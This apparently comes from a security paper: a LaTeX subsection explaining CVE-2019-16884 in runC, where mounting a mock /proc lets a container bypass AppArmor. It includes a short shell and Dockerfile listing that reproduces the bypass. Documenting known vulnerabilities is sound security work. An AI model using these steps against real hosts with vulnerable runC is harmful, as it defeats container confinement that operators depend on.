\subsection{CVE--2019--16884}\label{subsection:CVE-2019-16884}
A bug in runC (1.0.0-rc8 and older versions) made it possible to mount \lstinline{/proc} in a container. Because the active AppArmor profile is defined in \lstinline{/proc/self/attr/apparmor/current}, this vulnerability allows a container to completely bypass AppArmor.

\medskip

A proof of concept has been provided at\cite{CVE-2019-16884-Github}. We see that if we create a mock \lstinline{/proc}, the Docker starts without the specified AppArmor profile.
\begin{lstlisting}[caption={Bypass AppArmor by mounting \lstinline{/proc}.},captionpos=b]
(host)$ mkdir -p rootfs/proc/self/{attr,fd}
(host)$ touch rootfs/proc/self/{status,attr/exec}
(host)$ touch rootfs/proc/self/fd/{4,5}
(host)$ cat Dockerfile
FROM busybox
ADD rootfs /

VOLUME /proc
(host)$ docker build -t apparmor-bypass .
(host)$ docker run --rm -it --security-opt "apparmor=docker-default"  apparmor-bypass
# container runs unconfined
\end{lstlisting}
